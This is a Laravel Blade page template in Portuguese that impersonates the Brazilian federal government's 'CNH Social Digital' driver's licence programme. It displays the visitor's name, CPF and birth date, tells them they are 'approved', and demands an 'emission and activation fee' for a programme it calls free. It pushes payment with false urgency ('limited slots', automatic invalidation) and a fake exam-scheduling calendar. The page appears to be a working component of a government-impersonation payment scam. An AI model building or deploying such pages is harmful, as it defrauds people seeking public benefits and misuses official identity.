@extends('layouts.app')
@section('content')
    <div class="min-h-screen bg-background flex flex-col">
        @include('components.header')
        <main class="flex-1 px-4 py-6">
            <div class="max-w-2xl mx-auto">
                <div class="mb-6 text-sm">
                    <span class="text-govBlue hover:underline cursor-pointer">Início</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">Serviços</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">CNH</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-foreground">CNH Social Digital</span>
                </div>
                <div class="bg-card rounded-lg shadow-md border border-border p-6 space-y-6">
                    <div class="flex items-start justify-between gap-4">
                        <h1 class="text-2xl md:text-3xl font-bold text-[#1B4F9B]">Seus dados foram aprovados</h1>
                    </div>
                    <div class="bg-white border-2 border-[#1B4F9B] rounded-lg p-4 flex items-center justify-between">
                        <div class="flex items-center gap-3">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-file-text h-6 w-6 text-[#1B4F9B]"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"></path><path d="M14 2v4a2 2 0 0 0 2 2h4"></path><path d="M10 9H8"></path><path d="M16 13H8"></path><path d="M16 17H8"></path></svg>
                            <span class="font-semibold text-foreground">Protocolo de Inscrição:</span>
                        </div>
                        <span class="font-bold text-[#1B4F9B] text-lg protocolo"></span>
                    </div>
                    <div class="bg-gray-100 rounded-lg p-6">
                        <div class="bg-gradient-to-br from-blue-900 to-blue-700 rounded-lg p-4 text-white text-center">
                            <p class="text-sm mb-2">REPÚBLICA FEDERATIVA DO BRASIL</p>
                            <p class="text-xs mb-4">MINISTÉRIO DAS CIDADES - DENATRAN</p>
                            <div class="bg-white/20 rounded p-3 mb-3">
                                <p class="font-bold name uppercase"></p>
                            </div>
                            <div class="grid grid-cols-2 gap-2 text-xs">
                                <div class="bg-white/20 rounded p-2">
                                    <p>CPF: <span class="cpf"></span></p>
                                </div>
                                <div class="bg-white/20 rounded p-2">
                                    <p>NASC: <span class="nascimento"></span></p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="bg-blue-50 rounded-lg p-4 space-y-4">
                        <div class="flex items-start gap-3">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-info h-6 w-6 text-[#1B4F9B] flex-shrink-0 mt-1"><circle cx="12" cy="12" r="10"></circle><path d="M12 16v-4"></path><path d="M12 8h.01"></path></svg>
                            <div>
                                <h2 class="text-lg font-bold text-[#1B4F9B] mb-2">Taxa de Emissão e Ativação Digital</h2>
                                <p class="text-sm text-foreground mb-3">Para validar sua participação no programa, é necessária o pagamento único de <span class="font-bold text-[#1B4F9B]">R$ {{ number_format(env('PRINCIPAL'), 2, ',', '.') }}</span>.</p>
                                <p class="text-sm font-semibold text-foreground mb-2">Esse valor assegura:</p>
                                <ul class="list-disc list-inside space-y-1 text-sm text-foreground">
                                    <li>Emissão da CNH Digital</li>
                                    <li>Acesso à plataforma nacional</li>
                                    <li>Custos de integração com órgãos de trânsito</li>
                                </ul>
                                <p class="text-xs italic text-muted-foreground mt-3">⚠️ Atenção: inscrições sem pagamento são invalidadas automaticamente. As vagas são limitadas e liberadas em tempo real para novos candidatos.</p>
                            </div>
                        </div>
                    </div>
                    <div class="bg-blue-50 rounded-lg p-4 space-y-4">
                        <h2 class="font-bold text-foreground text-lg">Dados validado com sucesso no Sistema Nacional de Benefícios (SNR)</h2>
                        <p class="text-foreground">Parabéns <span class="font-bold firstName uppercase"></span> você foi aprovado com sucesso e já pode marcar seu exame médico e psicotécnicos! A conclusão dessa verificação é essencial para a liberação das aulas teóricas e práticas na autoescola parceira.</p>
                        <div>
                            <h3 class="font-bold text-[#1B4F9B] text-lg mb-3">Acompanhamento do Processo</h3>
                            <div class="bg-white rounded-lg p-4 space-y-3">
                                <div class="flex justify-between border-b border-border pb-2">
                                    <span class="font-semibold text-foreground">Nome Completo:</span>
                                    <span class="text-[#1B4F9B] font-semibold text-right uppercase name"></span>
                                </div>
                                <div class="flex justify-between border-b border-border pb-2">
                                    <span class="font-semibold text-foreground">CPF:</span>
                                    <span class="text-[#1B4F9B] font-semibold cpf"></span>
                                </div>
                                <div class="flex justify-between pb-2">
                                    <span class="font-semibold text-foreground">PROTOCOLO:</span>
                                    <span class="text-[#1B4F9B] font-semibold protocolo"></span>
                                </div>
                            </div>
                        </div>
                        <div class="bg-white border-l-4 border-[#1B4F9B] rounded p-3">
                            <div class="flex items-start gap-2">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-info h-5 w-5 text-[#1B4F9B] flex-shrink-0 mt-0.5"><circle cx="12" cy="12" r="10"></circle><path d="M12 16v-4"></path><path d="M12 8h.01"></path></svg>
                                <p class="text-sm text-foreground">Após a confirmação do pagamento da taxa de emissão, o sistema realizará automaticamente o agendamento dos exames obrigatórios em clínicas credenciadas ao programa. Todas as instruções necessárias para a realização dos exames e início das aulas teóricas e práticas serão enviadas ao seu e-mail cadastrado.</p>
                            </div>
                        </div>
                        <div class="space-y-3">
                            <div class="flex items-center gap-3 bg-white rounded-lg p-3">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big h-6 w-6 text-green-600"><path d="M21.801 10A10 10 0 1 1 17 3.335"></path><path d="m9 11 3 3L22 4"></path></svg>
                                <span class="font-semibold text-foreground">Dados validados</span>
                            </div>
                            <div class="flex items-center justify-between bg-white rounded-lg p-3">
                                <div class="flex items-center gap-3">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-x h-6 w-6 text-red-600"><circle cx="12" cy="12" r="10"></circle><path d="m15 9-6 6"></path><path d="m9 9 6 6"></path></svg>
                                    <span class="font-semibold text-foreground">Exame psicotécnico</span>
                                </div>
                                <button data-state="closed">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-info h-5 w-5 text-[#1B4F9B] cursor-pointer"><circle cx="12" cy="12" r="10"></circle><path d="M12 16v-4"></path><path d="M12 8h.01"></path></svg>
                                </button>
                            </div>
                            <div class="flex items-center justify-between bg-white rounded-lg p-3">
                                <div class="flex items-center gap-3">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-x h-6 w-6 text-red-600"><circle cx="12" cy="12" r="10"></circle><path d="m15 9-6 6"></path><path d="m9 9 6 6"></path></svg>
                                    <span class="font-semibold text-foreground">Exame Médico</span>
                                </div>
                                <button data-state="closed">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-info h-5 w-5 text-[#1B4F9B] cursor-pointer"><circle cx="12" cy="12" r="10"></circle><path d="M12 16v-4"></path><path d="M12 8h.01"></path></svg>
                                </button>
                            </div>
                        </div>
                        <button class="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-11 rounded-md px-8 w-full py-6 text-lg font-semibold bg-[#1B4F9B] hover:bg-[#1B4F9B]/90 text-white" id="btnContinuar">MARCAR EXAMES</button>
                    </div>
                    <div class="bg-white rounded-lg p-4 border-2 border-[#1B4F9B]">
                        <h3 class="font-bold text-[#1B4F9B] text-lg mb-3 text-center">Por que existe uma taxa, se o programa é gratuito?</h3>
                        <p class="text-sm text-foreground text-center leading-relaxed">Essa medida, adotada em parceria com autoescolas de todo o Brasil, visa evitar solicitações indevidas e garantir que o benefício chegue a quem de fato deseja obter sua primeira habilitação. Com isso, conseguimos manter a organização, o atendimento qualificado e a continuidade do projeto para todos que sonham em conquistar sua CNH.</p>
                    </div>
                </div>
            </div>
        </main>
        <footer class="mt-8 py-6 border-t border-border bg-card">
            <div class="max-w-4xl mx-auto px-4 text-center text-sm text-muted-foreground">&copy; {{date('Y')}} <strong>Governo Federal</strong>. Todos os direitos reservados.</div>
        </footer>
    </div>
<div class="fixed inset-0 z-50 bg-black/80 data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 overlay hidden"></div>
<div class="fixed left-[50%] top-[50%] z-50 grid w-full max-w-lg translate-x-[-50%] translate-y-[-50%] gap-4 border bg-background p-6 shadow-lg duration-200 data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[state=closed]:slide-out-to-left-1/2 data-[state=closed]:slide-out-to-top-[48%] data-[state=open]:slide-in-from-left-1/2 data-[state=open]:slide-in-from-top-[48%] sm:rounded-lg sm:max-w-[425px] max-h-[90vh] overflow-y-auto modal hidden">
    <div class="flex flex-col space-y-1.5 text-center sm:text-left pb-2">
        <h2 class="tracking-tight text-xl font-bold text-[#1B4F9B] text-center">AGENDAR AVALIAÇÃO</h2>
    </div>
    <div id="calendario"></div>
    <button class="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 h-11 rounded-md px-8 w-full py-4 text-base font-semibold text-white mt-2 bg-[#1B4F9B] hover:bg-[#1B4F9B]/90" disabled="" id="btnAgendar">REALIZAR AGENDAMENTO</button>
    <button type="button" class="absolute right-4 top-4 rounded-sm opacity-70 ring-offset-background transition-opacity data-[state=open]:bg-accent data-[state=open]:text-muted-foreground hover:opacity-100 focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none" id="closeModal">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-x h-4 w-4"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg>
        <span class="sr-only">Close</span>
    </button>
</div>



<style>
.flatpickr-calendar{
margin:-30px auto 0;
box-shadow: none;
} 
.flatpickr-current-month {
font-size: 16px;
}
.flatpickr-current-month .flatpickr-monthDropdown-months, .flatpickr-current-month input.cur-year{
color: rgb(27 79 155);
font-weight:500;
}
.flatpickr-months .flatpickr-prev-month, .flatpickr-months .flatpickr-next-month{
color: rgb(27 79 155);
}
.flatpickr-day{
display:flex;
align-items:center;
justify-content:center;
}
.flatpickr-day.today {
background: rgb(27, 79, 155);
color: #fff;
border-radius: 50%;
font-weight: 500;
opacity: 0.6;
}
.flatpickr-day.selected, .flatpickr-day.startRange, .flatpickr-day.endRange, .flatpickr-day.selected.inRange, .flatpickr-day.startRange.inRange, .flatpickr-day.endRange.inRange, .flatpickr-day.selected:focus, .flatpickr-day.startRange:focus, .flatpickr-day.endRange:focus, .flatpickr-day.selected:hover, .flatpickr-day.startRange:hover, .flatpickr-day.endRange:hover, .flatpickr-day.selected.prevMonthDay, .flatpickr-day.startRange.prevMonthDay, .flatpickr-day.endRange.prevMonthDay, .flatpickr-day.selected.nextMonthDay, .flatpickr-day.startRange.nextMonthDay, .flatpickr-day.endRange.nextMonthDay{
background:rgb(27, 79, 155);
border-color:rgb(27, 79, 155);
}
</style>
@endsection
@section('javascript')
<script>
const userData = JSON.parse(sessionStorage.getItem("userData"));
const userAddress = JSON.parse(sessionStorage.getItem("userAddress"));
if(!userData){
    window.location.href = "{{url('/login')}}";
} 

const primeiroNome = userData.NOME.split(' ')[0];
$('.firstName').text(primeiroNome);
$('.cpf').text(userData.CPF);
$('.name').text(userData.NOME);
$('.nascimento').text(userData.NASC);
$('.protocolo').text(userData.protocolo);

const hoje = new Date();
hoje.setHours(0, 0, 0, 0);

const datasHabilitadas = [
    "30/11/2025",
    "09/12/2025", "10/12/2025", "11/12/2025", "15/12/2025",
    "18/12/2025", "22/12/2025", "25/12/2025", "30/12/2025",
    "06/01/2026", "12/01/2026", "17/01/2026", "18/01/2026",
    "20/01/2026", "27/01/2026", "31/01/2026",
    "08/02/2026", "17/02/2026", "18/02/2026", "19/02/2026",
];

const converterParaDate = (dataString) => {
    const [dia, mes, ano] = dataString.split("/");
    return new Date(ano, mes - 1, dia);
};

const datasFuturas = datasHabilitadas.filter(dataString => {
    const dataHabilitada = converterParaDate(dataString);
    return dataHabilitada.getTime() >= hoje.getTime();
});

datasFuturas.sort((a, b) => {
    return converterParaDate(a).getTime() - converterParaDate(b).getTime();
});

const dataMin = datasFuturas.length > 0 ? datasFuturas[0] : null;
const dataMax = datasFuturas.length > 0 ? datasFuturas[datasFuturas.length - 1] : null;

flatpickr("#calendario", {
    locale: "pt",
    inline: true,
    dateFormat: "d/m/Y",

    minDate: dataMin,
    maxDate: dataMax,

    enable: datasFuturas,

    onChange: function (selectedDates, dateStr) {
        userData.agendamento = dateStr;
        sessionStorage.setItem("userData", JSON.stringify(userData));
        document.getElementById("btnAgendar").disabled = false;
    }
});

$(document).on('click', '#btnContinuar, #closeModal, .overlay', function(){
    $('.overlay').toggleClass('hidden');
    $('.modal').toggleClass('hidden');
});

$(document).on('click', '#btnAgendar', function(){
    window.location.href = "{{url('/agendar-exame')}}";
});

</script>
@endsection